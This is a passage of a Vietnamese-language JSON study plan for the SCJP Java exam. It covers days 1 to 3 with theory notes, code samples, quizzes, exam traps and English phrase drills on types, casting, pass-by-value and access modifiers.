          "exp": "Trong Java, tên class không tính vào args. Chỉ có tham số 'hello' được truyền nên args.length bằng 1."
        },
        {
          "id": "da1_9",
          "q": "Khai báo nào sau đây tạo ra mảng nặc danh hợp lệ?",
          "options": [
            "new int[3] {1, 2, 3}",
            "new int[] {1, 2, 3}",
            "int[3] new {1, 2, 3}",
            "new int[3]"
          ],
          "correct": 1,
          "exp": "Mảng nặc danh không được ghi kích thước trong ngoặc vuông khi đã khởi tạo bằng danh sách ngoặc nhọn: new int[] {1, 2, 3}."
        },
        {
          "id": "da1_10",
          "q": "Điều gì xảy ra khi in `System.out.println('A' + 1);`?",
          "options": [
            "In ra 'B'",
            "In ra 66",
            "Compile Error",
            "In ra 'A1'"
          ],
          "correct": 1,
          "exp": "Phép cộng char với int tự động nâng kiểu lên int: mã ASCII của 'A' là 65 + 1 = 66."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Khoảng giá trị của kiểu byte?",
          "a": "-128 đến 127",
          "trap": "Đừng nhầm với kiểu char không dấu (0..65535)"
        },
        {
          "q": "Literals true, false, null có phải keywords không?",
          "a": "KHÔNG, chúng là Literals nhưng cấm dùng làm tên định danh",
          "trap": "Đề thi hay hỏi từ nào là keyword"
        },
        {
          "q": "Số bắt đầu bằng số 0 (ví dụ 012) là hệ gì?",
          "a": "Hệ bát phân (Octal), 012 = 10 thập phân",
          "trap": "Chữ số 8 và 9 không hợp lệ trong bát phân"
        },
        {
          "q": "Biến cục bộ chưa gán giá trị có default value không?",
          "a": "KHÔNG, sử dụng sẽ bị Compile Error",
          "trap": "Chỉ có instance và static variable mới có default value"
        },
        {
          "q": "Khai báo mảng Thread[] arr = new Thread[5] tạo mấy object Thread?",
          "a": "0 object Thread, chỉ tạo 1 object mảng chứa 5 tham chiếu null",
          "trap": "Nhầm tưởng đã tạo 5 Thread chạy"
        }
      ],
      "dailyEnglish": [
        {
          "id": 1,
          "vi": "Lấy danh sách các trận đấu",
          "en": "Get list of matches",
          "grammar": "Get + Danh từ số nhiều / danh từ tập hợp"
        },
        {
          "id": 2,
          "vi": "Thực hiện xóa các trận đấu",
          "en": "Delete matches",
          "grammar": "Động từ hành động Delete + tân ngữ"
        },
        {
          "id": 3,
          "vi": "Tìm kiếm các trận đấu theo ngày giờ",
          "en": "Search matches by time",
          "grammar": "Search + tân ngữ + by + tiêu chí tìm kiếm"
        },
        {
          "id": 4,
          "vi": "Thực hiện thêm các trận đấu",
          "en": "Add matches",
          "grammar": "Add + tân ngữ"
        },
        {
          "id": 5,
          "vi": "Kiểm tra [var] có tồn tại hay không",
          "en": "Check if [var] exists",
          "grammar": "Check if + Chủ ngữ + Động từ số ít (exists)"
        }
      ]
    },
    "2": {
      "day": 2,
      "week": 1,
      "title": "Chapter 1: Language Fundamentals (Phần 2) + TestKing",
      "topics": [
        "Primitive vs Reference types",
        "Variable Initialization rules (Instance vs Static vs Local)",
        "Type Casting & implicit promotion",
        "Scope of variables (block, method, instance)"
      ],
      "tasks": [
        "Làm 20-30 câu TestKing về Primitive & Array",
        "Ghi chú vào Error Notebook: Vì sao local variable không có giá trị mặc định?",
        "Luyện 5 câu dịch Anh-Việt"
      ],
      "englishDrill": [
        {
          "id": 4,
          "vi": "Thực hiện thêm các trận đấu",
          "en": "Add matches"
        },
        {
          "id": 5,
          "vi": "(Kiểm tra [var] có tồn tại hay không )",
          "en": "Check if [var] exists"
        },
        {
          "id": 6,
          "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
          "en": "Return \"True\" if [var] exists or false if [var] does not exist"
        },
        {
          "id": 7,
          "vi": "(Lấy số ngày nghỉ của một tháng)",
          "en": "Get number of days off of a month"
        },
        {
          "id": 8,
          "vi": "(Lấy các tháng của năm)",
          "en": "Get months of year"
        }
      ],
      "summary": "Primitive vs Reference, Quy tắc khởi tạo biến (Default Values) và Ép kiểu (Casting).",
      "coreTheory": "\n### 1. Primitive vs Reference Types\n- **Primitive:** Lưu trực tiếp giá trị nhị phân trong ô nhớ (Stack hoặc Heap tùy vị trí khai báo).\n- **Reference:** Lưu địa chỉ tham chiếu trỏ đến đối tượng nằm trên vùng nhớ Heap. Mặc định là `null`.\n\n### 2. Quy tắc Khởi tạo Biến & Default Values\n- **Instance Variables (Biến đối tượng):** Tự động nhận giá trị mặc định khi `new` đối tượng (`0`, `0.0`, `false`, `null`).\n- **Static Variables (Biến tĩnh):** Tự động nhận giá trị mặc định khi nạp class.\n- **Local Variables (Biến cục bộ trong method):** **KHÔNG CÓ GIÁ TRỊ MẶC ĐỊNH!** Bắt buộc phải khởi tạo trước khi đọc, nếu không sẽ bị **Compile Error**.\n- **Array Elements:** Toàn bộ phần tử trong mảng LUÔN LUÔN nhận giá trị mặc định, kể cả mảng được khai báo trong method!\n",
      "codeSnippet": "public class ScopeDemo {\n    int instVar; // Default = 0\n    public void run() {\n        int localVar; // KHÔNG có default!\n        // System.out.println(localVar); // COMPILE ERROR!\n        localVar = 5;\n        System.out.println(localVar); // OK: 5\n        \n        int[] arr = new int[3];\n        System.out.println(arr[0]); // In ra 0 (Hợp lệ!)\n    }\n}",
      "traps": [
        "Local variable uninitialized là bẫy câu hỏi số 1 trong SCJP.",
        "Compiler Java kiểm tra Definite Assignment tĩnh: if không có else thì biến trong if coi như chưa chắc được gán."
      ],
      "quickQuiz": [
        {
          "q": "Phần tử mảng `boolean[] arr = new boolean[2];` có giá trị mặc định là gì?",
          "a": "false"
        },
        {
          "q": "Biến tham chiếu String chưa gán trong class có giá trị gì?",
          "a": "null"
        }
      ],
      "estimatedTime": "3h 30m",
      "difficulty": "⭐⭐⭐",
      "priority": "🔴 MUST KNOW (Trọng Tâm SCJP)",
      "source": "SCJP Chapter 1 (Ch01.pdf) & TestKing",
      "objectives": [
        "Phân biệt bản chất bộ nhớ giữa Primitive Types và Reference Types (Stack vs Heap).",
        "Hiểu sâu cơ chế Pass-by-Value trong Java khi truyền tham số là Đối tượng.",
        "Làm chủ quy tắc Type Promotion: Mọi phép toán số học nhị phân trên byte/short/char đều tự động nâng kiểu lên int.",
        "Nắm chắc quy tắc Ép kiểu: Implicit Widening (nới rộng tự động) vs Explicit Narrowing (thu hẹp bắt buộc ép kiểu).",
        "Quy tắc khởi tạo biến: Instance vs Static (tự nhận default) vs Local Variables (Definite Assignment)."
      ],
      "whyMatters": "Đề thi TestKing có rất nhiều câu lừa thí sinh ở phép toán 'byte b = 1; b = b + 1;' (Compile Error) và việc gán tham chiếu trong method. Nắm chắc ngày 2 giúp bạn không bao giờ mất điểm ở các câu bẫy cơ bản này!",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "partA",
          "title": "Part A: Primitive vs Reference & Bộ Nhớ Stack/Heap",
          "sourceRef": "SCJP Objective 1.2 (Ch01.pdf, Page 8-14)",
          "theory": "\nTrong Java, các kiểu dữ liệu được chia làm 2 thế giới tách biệt hoàn toàn:\n\n#### 1. Kiểu Nguyên Thủy (Primitive Types - 8 kiểu):\n- Lưu trữ **trực tiếp giá trị nhị phân** trong ô nhớ.\n- Khi được khai báo là biến cục bộ (local variable), chúng nằm trực tiếp trên **Stack**.\n- Khi gán `int a = b;`, Java copy toàn bộ giá trị nhị phân của `b` sang `a`. Thay đổi `a` không bao giờ ảnh hưởng tới `b`.\n\n#### 2. Kiểu Tham Chiếu (Reference Types - Object, String, Array...):\n- Bản thân biến tham chiếu chỉ lưu trữ **ĐỊA CHỈ Ô NHỚ (Memory Address)** trỏ tới đối tượng thực sự nằm trên vùng nhớ **Heap**.\n- Giá trị mặc định của biến tham chiếu khi là instance variable luôn là **`null`** (nghĩa là con trỏ chưa trỏ vào bất kỳ đối tượng nào trên Heap).\n- Khi gán `Dog d1 = d2;`, Java chỉ copy **địa chỉ con trỏ**, cả 2 biến cùng trỏ vào 1 đối tượng duy nhất trên Heap.\n\n#### ⚠️ Java là 100% Pass-by-Value:\n- Khi truyền một đối tượng vào hàm, Java copy **giá trị của con trỏ tham chiếu**.\n- Nếu bạn gọi `dog.setName(\"Max\")`, đối tượng thật trên Heap bị thay đổi.\n- Nhưng nếu bạn viết `dog = new Dog(\"Lucy\")`, bạn chỉ đang đổi hướng con trỏ bản sao cục bộ, con trỏ gốc bên ngoài hàm **HOÀN TOÀN KHÔNG ĐỔI**!\n",
          "code": "public class PassByValueDemo {\n    public static void modify(int x, StringBuilder sb) {\n        x = 100; // Chỉ đổi bản sao x trên Stack\n        sb.append(\" World\"); // Thao tác trực tiếp trên Heap\n        sb = new StringBuilder(\"Goodbye\"); // sb trỏ đi chỗ khác, không ảnh hưởng bên ngoài\n    }\n    public static void main(String[] args) {\n        int a = 10;\n        StringBuilder str = new StringBuilder(\"Hello\");\n        modify(a, str);\n        System.out.println(a); // In ra 10 (Không đổi!)\n        System.out.println(str); // In ra \"Hello World\"\n    }\n}"
        },
        {
          "id": "partB",
          "title": "Part B: Type Promotion & Casting (Ép Kiểu)",
          "sourceRef": "SCJP Objective 3.1 & 4.5 (Ch01.pdf, Page 16-21)",
          "theory": "\n#### 1. Quy tắc Nâng Kiểu Số Học (Numeric Type Promotion):\nTrong bất kỳ biểu thức số học nào (`+`, `-`, `*`, `/`, `%`):\n1. Nếu có một toán hạng là `double`, toàn bộ biểu thức được nâng lên `double`.\n2. Nếu không, nếu có toán hạng là `float`, toàn bộ nâng lên `float`.\n3. Nếu không, nếu có toán hạng là `long`, toàn bộ nâng lên `long`.\n4. **NGUYÊN TẮC VÀNG BẪY THI:** Nếu tất cả các toán hạng chỉ là `byte`, `short`, hoặc `char`, thì Java **TỰ ĐỘNG NÂNG TẤT CẢ LÊN `int`** trước khi thực hiện phép tính!\n\n#### 2. Ví dụ Cạm Bẫy Kinh Điển:\n- `byte b1 = 10; byte b2 = 20;`\n- `byte b3 = b1 + b2;` $\\rightarrow$ **COMPILE ERROR: possible loss of precision**! (Vì `b1 + b2` cho ra kết quả kiểu `int`, gán ngược lại cho `byte` bị compiler chặn).\n- Muốn đúng phải ép kiểu: `byte b3 = (byte)(b1 + b2);`\n- **Toán tử gộp (Compound Assignment) tự động ép kiểu:**\n  - `b1 += b2;` $\\rightarrow$ **HỢP LỆ!** Vì `b1 += b2` tương đương với `b1 = (byte)(b1 + b2)`.\n  - `b1++;` $\\rightarrow$ **HỢP LỆ!** Tương đương `b1 = (byte)(b1 + 1)`.\n\n#### 3. Widening vs Narrowing Casting:\n- **Widening (Nới rộng):** Từ kiểu nhỏ sang kiểu lớn hơn (`byte -> short -> int -> long -> float -> double`). Hoàn toàn tự động (Implicit), không sợ mất dữ liệu.\n- **Narrowing (Thu hẹp):** Từ kiểu lớn về kiểu nhỏ. Bắt buộc phải viết ép kiểu tường minh `(type)`. Nếu giá trị vượt quá khoảng giới hạn, sẽ xảy ra hiện tượng **tràn số (Overflow / Truncation)**.\n",
          "code": "byte a = 127;\na++; // a = (byte)(127 + 1) -> tràn số thành -128!\nSystem.out.println(\"a sau khi ++: \" + a);\n\nint big = 130;\nbyte small = (byte) big; // 130 - 256 = -126\nSystem.out.println(\"small sau khi ép kiểu: \" + small);\n\n// float f = 1.5; // COMPILE ERROR: 1.5 mặc định là double!\nfloat f1 = 1.5f; // Hợp lệ\nfloat f2 = (float) 1.5; // Hợp lệ"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d2_1",
          "level": "Medium",
          "question": "Kết quả in ra màn hình của đoạn code sau là gì?",
          "code": "public class TestDay2 {\n    static void test(int[] arr) {\n        arr[0] = 99;\n        arr = new int[]{1, 2, 3};\n        arr[0] = 88;\n    }\n    public static void main(String[] args) {\n        int[] myArr = {10, 20};\n        test(myArr);\n        System.out.println(myArr[0] + \" \" + myArr[1]);\n    }\n}",
          "options": [
            "99 20",
            "88 20",
            "10 20",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "1. `myArr` trỏ tới mảng {10, 20} trên Heap. Khi gọi `test(myArr)`, con trỏ bản sao `arr` cũng trỏ tới mảng này.\n2. `arr[0] = 99;` thay đổi phần tử đầu tiên của mảng thật trên Heap thành 99.\n3. `arr = new int[]{1, 2, 3};` chỉ làm biến cục bộ `arr` trỏ sang mảng mới, biến `myArr` ở hàm main hoàn toàn không bị ảnh hưởng.\n4. Do đó `myArr[0]` là 99 và `myArr[1]` là 20."
        },
        {
          "id": "ct_d2_2",
          "level": "Hard",
          "question": "Đoạn code sau in ra kết quả gì?",
          "code": "public class PromotionTrap {\n    public static void main(String[] args) {\n        byte b = 10;\n        b += 5;\n        // b = b + 5; // Dòng này nếu mở ra sẽ Compile Error\n        System.out.print(b + \" \");\n        b = (byte)(b * 20);\n        System.out.print(b);\n    }\n}",
          "options": [
            "15 -56",
            "15 300",
            "15 44",
            "Compile Error"
          ],
          "correctIndex": 2,
          "explanation": "1. `b += 5` tự động ép kiểu thành `(byte)(10 + 5) = 15`.\n2. `b * 20 = 15 * 20 = 300`. Nhưng kiểu byte chỉ lưu từ -128 đến 127. 300 biểu diễn nhị phân 32-bit là `0x0000012C`. Lấy 8 bit cuối `0x2C` = 44 trong hệ thập phân! Kết quả in ra: `15 44`."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy toán tử gộp (b += 1) vs phép cộng tường minh (b = b + 1)",
          "whyPeopleWrong": "Nhiều người nghĩ b += 1 và b = b + 1 giống hệt nhau.",
          "wrongThinking": "Tưởng rằng cả hai đều giữ nguyên kiểu byte hoặc cả hai đều bị lỗi compile.",
          "correctRule": "Toán tử gộp (+=, -=, *=, /=, ++, --) luôn tự động chèn ép kiểu ngầm định của kiểu dữ liệu vế trái: E1 op= E2 tương đương E1 = (T)(E1 op E2).",
          "code": "byte b = 5;\nb += 5; // Hợp lệ, tự ép kiểu thành byte\n// b = b + 5; // COMPILE ERROR: b + 5 sinh ra int, không gán được cho byte!",
          "miniCheck": "Bất cứ khi nào thấy phép cộng byte/short/char bằng dấu +, hãy kiểm tra xem có ép kiểu tường minh (byte) hay không!"
        },
        {
          "trap": "Local Variable Uninitialized trong mảng",
          "whyPeopleWrong": "Nhầm lẫn giữa biến tham chiếu mảng và các phần tử bên trong mảng.",
          "wrongThinking": "Tưởng rằng mảng khai báo trong method thì phần tử cũng không có giá trị mặc định.",
          "correctRule": "Bản thân biến tham chiếu int[] arr nếu khai báo cục bộ thì không có default value. Nhưng một khi đã new int[5], tất cả 5 phần tử bên trong LUÔN ĐƯỢC GÁN DEFAULT VALUE (0, false, null) bất kể mảng nằm ở đâu!",
          "code": "public void test() {\n    int[] arr; // Chưa new -> không đọc được arr!\n    // System.out.println(arr); // COMPILE ERROR\n    arr = new int[3];\n    System.out.println(arr[0]); // IN RA 0 (Hợp lệ hoàn toàn!)\n}",
          "miniCheck": "Các phần tử mảng luôn nằm trên Heap và luôn có Default Value."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Nhận diện kiểu dữ liệu và ép kiểu",
          "questions": [
            {
              "q": "Trong Java, các số nguyên như `100` và số thực như `3.14` khi viết trực tiếp (literal) có kiểu dữ liệu mặc định là gì?",
              "ans": "Số nguyên mặc định là `int` (4 bytes). Số thực có dấu phẩy động mặc định là `double` (8 bytes)."
            },
            {
              "q": "Khai báo `float f = 3.14;` có hợp lệ không? Tại sao?",
              "ans": "Không hợp lệ, Compile Error: possible loss of precision. Vì `3.14` là kiểu `double`, không thể gán trực tiếp cho biến kiểu `float` (4 bytes) nếu không thêm hậu tố `F`/`f` hoặc ép kiểu `(float)3.14`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Cơ chế Numeric Promotion trong biểu thức",
          "questions": [
            {
              "q": "Tại sao phép cộng `byte b1 = 10; byte b2 = 20; byte b3 = b1 + b2;` lại bị lỗi biên dịch?",
              "ans": "Trong Java, mọi toán tử nhị phân số học (+, -, *, /, %) áp dụng cho kiểu nhỏ hơn `int` (byte, short, char) đều tự động nâng kiểu (Numeric Promotion) lên `int`. Do đó `b1 + b2` trả về kết quả kiểu `int`. Gán `int` vào `byte` mà không ép kiểu tường minh sẽ bị lỗi biên dịch."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Phân tích luồng biến đổi dữ liệu",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nbyte b = 127;\nb++;\nSystem.out.println(b);\n```\nKết quả in ra màn hình là bao nhiêu? Giải thích cơ chế?",
              "ans": "In ra: -128. Giải thích: Kiểu `byte` có 8-bit có dấu, giá trị từ -128 đến 127. Biểu diễn nhị phân của 127 là 01111111. Khi thực hiện `b++`, bit chuyển thành 10000000, đây là biểu diễn bù 2 của số -128 (hiện tượng tràn số nguyên Overflow)."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy toán tử gộp vs toán tử thường",
          "questions": [
            {
              "q": "Đoạn code sau có biên dịch được không?\n```java\nshort s = 5;\ns += 10;\ns = s + 10;\n```",
              "ans": "Lỗi tại dòng `s = s + 10;`. Dòng `s += 10;` biên dịch thành công vì toán tử gộp tự chèn ép kiểu: `s = (short)(s + 10)`. Trong khi đó `s + 10` biến thành `int`, gán vào `short` gây Compile Error."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Thử thách góc khuất kiểu dữ liệu",
          "questions": [
            {
              "q": "Biểu thức `System.out.println(1.0 / 0.0);` và `System.out.println(1 / 0);` khác nhau thế nào?",
              "ans": "`1 / 0` ném ra `java.lang.ArithmeticException: / by zero` (phép chia số nguyên). `1.0 / 0.0` tuân theo chuẩn IEEE 754 số thực dấu phẩy động và in ra chuỗi `Infinity` mà không ném ngoại lệ."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_2_1",
          "q": "Cho đoạn mã sau:\n```java\nbyte a = 40, b = 50;\nbyte c = (byte)(a + b);\nint d = a + b;\n```\nPhát biểu nào sau đây là ĐÚNG?",
          "options": [
            "Cả 3 dòng lệnh đều biên dịch và thực thi hợp lệ mà không có lỗi",
            "Dòng `byte c = (byte)(a + b);` gây lỗi biên dịch",
            "Dòng `int d = a + b;` gây lỗi biên dịch vì a và b là kiểu byte",
            "Cả 2 dòng khai báo c và d đều bị lỗi Compile Error"
          ],
          "correct": 0,
          "exp": "Phép toán `a + b` tự động nâng kiểu lên `int`. Dòng 2 có ép kiểu `(byte)` nên hợp lệ. Dòng 3 gán kết quả `int` cho biến `int d` hoàn toàn hợp lệ."
        },
        {
          "id": "da_2_2",
          "q": "Xét hàm sau:\n```java\npublic static void update(String str) {\n    str.concat(\" World\");\n    str += \"!\";\n}\npublic static void main(String[] args) {\n    String s = \"Hello\";\n    update(s);\n    System.out.println(s);\n}\n```\nKết quả in ra màn hình là gì?",
          "options": [
            "Hello",
            "Hello World!",
            "Hello!",
            "Compile Error"
          ],
          "correct": 0,
          "exp": "String là Immutable và Java là Pass-by-Value. Cả phương thức `str.concat()` và toán tử `str +=` đều tạo ra các đối tượng mới và chỉ gán cho con trỏ bản sao `str` trong method. Biến `s` ở hàm main hoàn toàn giữ nguyên giá trị 'Hello'."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Phân biệt cơ bản giữa Primitive types và Reference types trong bộ nhớ JVM?",
          "a": "Primitive types (byte, short, int, long, float, double, char, boolean) lưu giá trị trực tiếp trên Stack (hoặc trong object nếu là field). Reference types lưu địa chỉ tham chiếu trỏ tới vùng nhớ đối tượng trên Heap.",
          "trap": "Mảng của kiểu primitive (như int[]) bản thân nó là một Object trên Heap, không phải primitive!"
        },
        {
          "q": "Cơ chế truyền tham số trong Java là Pass-by-Value hay Pass-by-Reference?",
          "a": "Java là 100% Pass-by-Value. Với primitive, truyền bản sao giá trị. Với object, truyền bản sao của con trỏ tham chiếu (copy of reference value) chứ không phải bản thân con trỏ gốc.",
          "trap": "Thay đổi thuộc tính của object trong hàm sẽ ảnh hưởng bên ngoài, nhưng gán `obj = new Object()` bên trong hàm hoàn toàn không đổi con trỏ bên ngoài!"
        },
        {
          "q": "Khai báo `int[] a, b[];` thì `a` và `b` có kiểu dữ liệu là gì?",
          "a": "`a` là mảng 1 chiều (`int[]`), còn `b` là mảng 2 chiều (`int[][]`) do cặp ngoặc `[]` đặt sau tên biến `b`.",
          "trap": "Đề thi TestKing rất hay bẫy cú pháp khai báo mảng nhiều biến trên cùng 1 dòng."
        }
      ],
      "dailyEnglish": [
        {
          "id": 4,
          "vi": "Thực hiện thêm các trận đấu",
          "en": "Add matches"
        },
        {
          "id": 5,
          "vi": "(Kiểm tra [var] có tồn tại hay không )",
          "en": "Check if [var] exists"
        },
        {
          "id": 6,
          "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
          "en": "Return \"True\" if [var] exists or false if [var] does not exist"
        },
        {
          "id": 7,
          "vi": "(Lấy số ngày nghỉ của một tháng)",
          "en": "Get number of days off of a month"
        },
        {
          "id": 8,
          "vi": "(Lấy các tháng của năm)",
          "en": "Get months of year"
        }
      ],
      "chapter": "Chapter 1: Language Fundamentals (Phần 2)"
    },
    "3": {
      "day": 3,
      "week": 1,
      "title": "Chapter 2: Declarations & Access Control (Phần 1)",
      "topics": [
        "Access Modifiers: public, protected, default (package-private), private",
        "Class declaration rules (public vs default class trong 1 file)",
        "Package statements & import rules"
      ],
      "tasks": [
        "Vẽ và điền bảng Access Modifiers Matrix cho Class/Package/Subclass/World",
        "Code thử kế thừa protected ở khác package để hiểu rõ protected"
      ],
      "englishDrill": [
        {
          "id": 7,
          "vi": "(Lấy số ngày nghỉ của một tháng)",
          "en": "Get number of days off of a month"
        },
        {
          "id": 8,
          "vi": "(Lấy các tháng của năm)",
          "en": "Get months of year"
        },
        {
          "id": 9,
          "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
          "en": "Get all days off of months and years from database"
        },
        {
          "id": 10,
          "vi": "Xóa tất cả ngày nghỉ của một tháng",
          "en": "Delete all days off of a month"
        },
        {
          "id": 11,
          "vi": "(Trả về true nếu thành công hoặc false nếu thất bại",
          "en": "Return \"true\" on success or \"false\" on failure"
        }
      ],
      "summary": "Declarations & Access Modifiers: public, protected, default (package-private), private.",
      "coreTheory": "\n### 1. Ma trận 4 mức Access Modifiers\n- `public`: Truy cập từ bất kỳ đâu trong toàn bộ ứng dụng.\n- `protected`: Truy cập trong cùng class, cùng package, và **Class con (Subclass) ở khác package thông qua kế thừa**.\n- `default (package-private)`: Chỉ truy cập được trong các class cùng package.\n- `private`: Chỉ truy cập được bên trong chính class khai báo.\n\n### 2. Bẫy kế thừa Protected ở khác package\n- Class con ở package khác chỉ có thể truy cập thuộc tính `protected` thông qua biến tham chiếu của chính nó hoặc `super`.\n- Nếu dùng tham chiếu của class cha (`Parent p = new Parent(); p.protectedVar`) sẽ bị **Compile Error**!\n",
      "codeSnippet": "// File Parent.java (package p1)\npackage p1;\npublic class Parent {\n    protected int x = 10;\n}\n\n// File Child.java (package p2)\npackage p2;\nimport p1.Parent;\npublic class Child extends Parent {\n    void test() {\n        System.out.println(this.x); // OK: truy cập qua kế thừa\n        Parent p = new Parent();\n        // System.out.println(p.x); // COMPILE ERROR: x is protected!\n    }\n}",
      "traps": [
        "Class con ở khác package gọi parentRef.protectedVar là lỗi biên dịch.",
        "Class cấp cao nhất (Top-level class) chỉ có thể là public hoặc default, không thể là private hay protected."
      ],
      "quickQuiz": [
        {
          "q": "Top-level class có thể khai báo là `protected` không?",
          "a": "Không, chỉ có thể là public hoặc default."
        },
        {
          "q": "Modifier nào cho phép truy cập chỉ trong cùng package?",
          "a": "default (package-private)"
        }
      ],
      "estimatedTime": "3h 30m",
      "difficulty": "⭐⭐⭐",
      "priority": "🔴 MUST KNOW (Trọng Tâm SCJP & TestKing)",
      "source": "SCJP Chapter 2 (Ch02.pdf) & TestKing",
      "objectives": [
        "Nắm vững 4 mức độ truy cập (Access Modifiers): public, protected, default (package-private), private.",
        "Làm chủ cạm bẫy Protected Access: Khi truy cập từ subclass ở package khác, chỉ được truy cập qua biến tham chiếu của subclass đó.",
        "Quy tắc khai báo Class trong file mã nguồn .java: Tối đa 1 public class, tên file phải trùng tên public class.",
        "Quy tắc Package và Import statements: Thứ tự file (package -> import -> class), import static vs regular import."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "partA",
          "title": "Part A: Ma Trận 4 Access Modifiers & Bẫy Protected",
          "sourceRef": "SCJP Objective 1.2 (Ch02.pdf, Page 4-15)",
          "theory": "\n### Bảng Ma Trận Quyền Truy Cập (Access Modifiers Matrix):\n| Modifier | Trong cùng Class | Cùng Package | Subclass ở Package khác | Bất kỳ đâu (World) |\n| :--- | :---: | :---: | :---: | :---: |\n| `public` | ✅ | ✅ | ✅ | ✅ |\n| `protected` | ✅ | ✅ | **✅ (Có điều kiện bẫy!)** | ❌ |\n| `default` (package-private) | ✅ | ✅ | ❌ | ❌ |\n| `private` | ✅ | ❌ | ❌ | ❌ |\n\n#### ⚠️ CẠM BẪY SỐ 1 CỦA SCJP: PROTECTED TRUY CẬP XUYÊN PACKAGE:\n- Khi một Class con (`Child`) ở package `pkgB` kế thừa từ Class cha (`Parent`) ở package `pkgA`, `Child` được thừa hưởng các thuộc tính/phương thức `protected`.\n- **ĐIỀU KIỆN QUYẾT ĐỊNH:** Bên trong class `Child`, bạn CHỈ ĐƯỢC PHÉP TRUY CẬP thuộc tính `protected` đó thông qua **biến tham chiếu của chính nó (`this` hoặc `Child c = new Child()`)**, hoặc con của nó!\n- Nếu bạn tạo biến tham chiếu của class Cha: `Parent p = new Parent();` rồi gọi `p.protectedMember` $\\rightarrow$ **COMPILE ERROR NGAY LẬP TỨC!** (Vì nhìn từ bên ngoài package, đối tượng Parent không được coi là subclass).\n",
          "code": "// Package pkgA\npackage pkgA;\npublic class Parent {\n    protected int x = 10;\n}\n\n// Package pkgB\npackage pkgB;\nimport pkgA.Parent;\npublic class Child extends Parent {\n    public void test() {\n        System.out.println(this.x); // HỢP LỆ: Truy cập qua kế thừa\n        Child c = new Child();\n        System.out.println(c.x); // HỢP LỆ: Truy cập qua tham chiếu Child\n        \n        Parent p = new Parent();\n        // System.out.println(p.x); // COMPILE ERROR: x has protected access in Parent!\n    }\n}"
        },
        {
          "id": "partB",
          "title": "Part B: Cấu Trúc File Mã Nguồn .java & Import Rules",
          "sourceRef": "SCJP Objective 4.1 (Ch02.pdf, Page 16-25)",
          "theory": "\n#### 1. Quy tắc cấu trúc file .java:\nThứ tự các thành phần trong 1 file Java BẮT BUỘC theo thứ tự:\n1. `package statement` (tối đa 1 dòng, nếu có phải nằm ở dòng code đầu tiên).\n2. `import statements` (nằm giữa package và class declaration).\n3. `class / interface declarations`.\n\n#### 2. Quy tắc Public Class:\n- Trong một file `.java`, **chỉ được phép có TỐI ĐA 1 public class**.\n- Nếu file có chứa một public class, thì **tên của file bắt buộc phải trùng khớp 100% với tên public class đó** (kể cả chữ hoa/thường). Ví dụ class `public class MyClass` phải nằm trong file `MyClass.java`.\n- Một file có thể chứa **nhiều class không public (default class)**, và khi đó tên file có thể đặt tùy ý không cần trùng tên class nào!\n\n#### 3. Cạm bẫy Import:\n- `import java.util.*;` chỉ import các class trực tiếp trong package `java.util`, **KHÔNG IMPORT các class trong package con** như `java.util.regex.*`!\n- Hai package chứa class cùng tên: `java.util.Date` và `java.sql.Date`. Nếu import cả 2 với `*`, khi viết `Date d;` compiler sẽ báo lỗi **Ambiguous Class Reference**. Bắt buộc phải khai báo tường minh tên package đầy đủ khi tạo biến.\n",
          "code": "// File: MultiClassDemo.java (Tên file hợp lệ)\nclass A {}\nclass B {}\nclass C {}\n// File này không có public class nào -> Hợp lệ và biên dịch ra A.class, B.class, C.class!\n\n// import static: Cho phép gọi trực tiếp phương thức tĩnh mà không cần tên class\nimport static java.lang.Math.PI;\nimport static java.lang.Math.sqrt;\n\npublic class StaticImportDemo {\n    public static void main(String[] args) {\n        System.out.println(sqrt(16)); // Thay vì Math.sqrt(16)\n        System.out.println(PI); // Thay vì Math.PI\n    }\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d3_1",
          "level": "Hard",
          "question": "Xét 2 file ở 2 package khác nhau sau đây. Điều gì xảy ra khi biên dịch Sub.java?",
          "code": "// File: p1/Base.java\npackage p1;\npublic class Base {\n    protected void show() { System.out.println(\"Base\"); }\n}\n\n// File: p2/Sub.java\npackage p2;\nimport p1.Base;\npublic class Sub extends Base {\n    public static void main(String[] args) {\n        Base b = new Sub();\n        // b.show(); // Dòng 1\n        Sub s = new Sub();\n        s.show(); // Dòng 2\n    }\n}",
          "options": [
            "Biên dịch thành công và in ra 'Base'",
            "Nếu mở Dòng 1 (b.show()) sẽ bị Compile Error",
            "Dòng 2 bị Compile Error vì phương thức show() là protected",
            "Cả Dòng 1 và Dòng 2 đều không thể truy cập show()"
          ],
          "correctIndex": 1,
          "explanation": "Phương thức show() có phạm vi protected trong package p1. Class Sub ở package p2 kế thừa Base. Tại Dòng 2, biến tham chiếu `s` là kiểu `Sub` nên được phép gọi `show()`. Nhưng ở Dòng 1, biến `b` là kiểu `Base`, đứng trong package p2 gọi phương thức protected qua tham chiếu của Base sẽ bị chặn bởi compiler: 'show() has protected access in Base'."
        }
      ],
      "examTraps": [
        {
          "trap": "Bẫy import package con (Sub-packages không tự động import)",
          "whyPeopleWrong": "Tưởng rằng import java.awt.* sẽ tự động dùng được các class trong java.awt.event.*.",
